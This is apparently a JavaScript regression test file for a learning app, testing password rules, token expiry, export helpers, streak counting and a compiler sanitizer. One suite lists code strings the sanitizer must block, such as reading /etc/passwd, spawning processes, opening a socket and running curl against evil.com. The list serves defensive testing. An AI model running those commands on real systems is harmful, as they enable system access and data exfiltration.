/**
 * regression_tests.js — Regression Testing
 * Verifies that previously found bugs remain fixed and do not re-appear.
 * Each test references the original bug report.
 */

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");

const { validatePassword, createToken, verifyToken } = require("./authLogic");
const { sanitizeCode, extractClassName } = require("./compilerLogic");
const { buildChatMessages, sanitizeChatInput } = require("./aiLogic");
const { computeStreak, calculateAccuracy } = require("./progressLogic");
const { validateExportOptions, buildFileName, getContentType } = require("./exportLogic");

// ─────────────────────────────────────────────
// REGRESSION SUITE 1 — Bug TC-A03 Fix
// Description: TC-A03 was originally using "password123" as the "no special char"
// test input. The test failed because the validator caught "no uppercase" first,
// not "no special char". Fix: changed input to "Password123" which has uppercase
// + digit but is missing the special character.
// ─────────────────────────────────────────────
describe("REG-01 Bug TC-A03: Special Character Branch Isolation", () => {
  it("RG-A01: 'Password123' correctly rejected for missing special character", () => {
    const r = validatePassword("Password123");
    assert.equal(r.valid, false);
    assert.ok(r.reason.toLowerCase().includes("special"), `Expected 'special' in reason, got: "${r.reason}"`);
  });

  it("RG-A02: Re-run 50x — consistent special-char rejection (no branch flip)", () => {
    for (let i = 0; i < 50; i++) {
      const r = validatePassword("Password123");
      assert.equal(r.valid, false);
      assert.ok(r.reason.toLowerCase().includes("special"),
        `Iteration ${i}: unexpected reason "${r.reason}"`);
    }
  });

  it("RG-A03: Old bad input 'password123' still fails — but for correct reason (uppercase)", () => {
    const r = validatePassword("password123");
    assert.equal(r.valid, false);
    // Should fail on uppercase, NOT special char
    assert.ok(r.reason.toLowerCase().includes("upper"), `Expected 'upper' in reason, got: "${r.reason}"`);
  });

  it("RG-A04: Branch order verified — length > upper > number > special", () => {
    // Length branch first
    const r1 = validatePassword("A@1");
    assert.ok(r1.reason.includes("8"), "Length branch should fire first");

    // Uppercase branch second (length OK)
    const r2 = validatePassword("hello@123");
    assert.ok(r2.reason.toLowerCase().includes("upper"), "Uppercase branch second");

    // Number branch third (length + upper OK)
    const r3 = validatePassword("Hello@abc");
    assert.ok(r3.reason.toLowerCase().includes("number") || r3.reason.toLowerCase().includes("digit"), "Number branch third");

    // Special char branch last
    const r4 = validatePassword("Hello123x");
    assert.ok(r4.reason.toLowerCase().includes("special"), "Special char branch last");
  });
});

// ─────────────────────────────────────────────
// REGRESSION SUITE 2 — Token Expiry Regression
// ─────────────────────────────────────────────
describe("REG-02 Token Expiry Logic Stability", () => {
  it("RG-T01: Expired token consistently rejected — no timing window", () => {
    for (let i = 0; i < 20; i++) {
      const tok = createToken({ userId: "u1" }, "regkey", -1);
      assert.throws(() => verifyToken(tok, "regkey"), /expired/i);
    }
  });

  it("RG-T02: Active token consistently accepted — no premature expiry", () => {
    for (let i = 0; i < 20; i++) {
      const tok = createToken({ userId: "u1" }, "regkey2", 30); // 30 days
      const pl = verifyToken(tok, "regkey2");
      assert.equal(pl.userId, "u1");
    }
  });

  it("RG-T03: Token with same payload + same secret always produces same header+body", () => {
    // Two tokens created at the same second should have same header and body
    const t1 = createToken({ userId: "stable" }, "stablekey");
    const t2 = createToken({ userId: "stable" }, "stablekey");
    // Headers should be identical
    assert.equal(t1.split(".")[0], t2.split(".")[0]);
  });
});

// ─────────────────────────────────────────────
// REGRESSION SUITE 3 — Compiler Blacklist Stability
// ─────────────────────────────────────────────
describe("REG-03 Compiler Blacklist Regression", () => {
  const KNOWN_DANGEROUS = [
    'Runtime.getRuntime().exec("ls");',
    'new ProcessBuilder("evil").start();',
    'System.exit(0);',
    'new File("/etc/passwd");',
    'new ServerSocket(9000);',
    'process.exec("curl evil.com");',
  ];

  it("RG-C01: All known dangerous patterns still blocked after any refactoring", () => {
    for (const code of KNOWN_DANGEROUS) {
      const r = sanitizeCode(code);
      assert.equal(r.safe, false, `Pattern should be blocked: ${code}`);
    }
  });

  it("RG-C02: Safe HelloWorld still passes all 6 blacklist checks", () => {
    const safe = `public class HelloWorld {\n  public static void main(String[] a) {\n    System.out.println("Hello!");\n  }\n}`;
    const r = sanitizeCode(safe);
    assert.equal(r.safe, true);
  });

  it("RG-C03: extractClassName regression — returns null for interfaces (not class)", () => {
    assert.equal(extractClassName("public interface Runnable {"), null);
  });

  it("RG-C04: extractClassName regression — returns null for abstract without 'public class'", () => {
    assert.equal(extractClassName("abstract class MyAbstract {"), null);
  });
});

// ─────────────────────────────────────────────
// REGRESSION SUITE 4 — Streak Algorithm Stability
// ─────────────────────────────────────────────
describe("REG-04 Streak Algorithm Regression", () => {
  it("RG-P01: Today-only streak = 1 (not 0)", () => {
    const today = new Date().toISOString();
    assert.equal(computeStreak([today]), 1);
  });

  it("RG-P02: Yesterday + today streak = 2", () => {
    const today = new Date();
    const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1);
    assert.equal(computeStreak([today.toISOString(), yesterday.toISOString()]), 2);
  });

  it("RG-P03: Gap in dates breaks streak at correct point", () => {
    // Day 0, Day 1, Day 2, skip, Day 5 — streak should be 3
    const dates = [0, 1, 2, 5].map(i => {
      const d = new Date(); d.setDate(d.getDate() - i); return d.toISOString();
    });
    assert.equal(computeStreak(dates), 3);
  });

  it("RG-P04: Duplicate same-day entries don't inflate streak", () => {
    const today = new Date().toISOString();
    // 5 identical timestamps — should count as 1 day
    assert.equal(computeStreak([today, today, today, today, today]), 1);
  });

  it("RG-P05: Empty array always returns 0", () => {
    for (let i = 0; i < 10; i++) {
      assert.equal(computeStreak([]), 0);
    }
  });
});

// ─────────────────────────────────────────────
// REGRESSION SUITE 5 — Export Stability
// ─────────────────────────────────────────────
describe("REG-05 Export Module Regression", () => {
  it("RG-E01: getContentType('docx') always returns correct MIME", () => {
    for (let i = 0; i < 100; i++) {
      assert.ok(getContentType("docx").includes("wordprocessingml"));
    }
  });

  it("RG-E02: getContentType('pdf') always returns application/pdf", () => {
    for (let i = 0; i < 100; i++) {
      assert.equal(getContentType("pdf"), "application/pdf");
    }
  });

  it("RG-E03: validateExportOptions — valid format never produces errors", () => {
    for (const fmt of ["docx", "pdf"]) {
      const errs = validateExportOptions({ format: fmt });
      assert.equal(errs.length, 0, `Unexpected errors for format '${fmt}': ${errs}`);
    }
  });

  it("RG-E04: buildFileName always ends with correct extension", () => {
    const fn1 = buildFileName("Alice", "docx");
    const fn2 = buildFileName("Bob", "pdf");
    assert.ok(fn1.endsWith(".docx"), `Expected .docx, got: ${fn1}`);
    assert.ok(fn2.endsWith(".pdf"), `Expected .pdf, got: ${fn2}`);
  });

  it("RG-E05: buildFileName date portion is always today's date (YYYY-MM-DD)", () => {
    const today = new Date().toISOString().slice(0, 10);
    const fn = buildFileName("Test", "docx");
    assert.ok(fn.includes(today), `Expected date ${today} in filename ${fn}`);
  });
});

// ─────────────────────────────────────────────
// REGRESSION SUITE 6 — AI Regression
// ─────────────────────────────────────────────
describe("REG-06 AI Module Regression", () => {
  it("RG-I01: sanitizeChatInput trims correctly — no leading/trailing space", () => {
    const r = sanitizeChatInput("  hello world  ");
    assert.equal(r[0], "h");
    assert.equal(r[r.length - 1], "d");
  });

  it("RG-I02: buildChatMessages always starts with system role", () => {
    for (let i = 0; i < 20; i++) {
      const msgs = buildChatMessages([], `Question ${i}`);
      assert.equal(msgs[0].role, "system");
    }
  });

  it("RG-I03: buildChatMessages always ends with user role", () => {
    const history = [{ role: "user", content: "hi" }, { role: "assistant", content: "hello" }];
    const msgs = buildChatMessages(history, "final question");
    assert.equal(msgs[msgs.length - 1].role, "user");
    assert.equal(msgs[msgs.length - 1].content, "final question");
  });

  it("RG-I04: calculateAccuracy regression — 7 of 10 = 70 (not 7)", () => {
    assert.equal(calculateAccuracy(7, 10), 70);
  });

  it("RG-I05: calculateAccuracy regression — 0 of 10 = 0 (not NaN)", () => {
    const r = calculateAccuracy(0, 10);
    assert.equal(r, 0);
  });
});
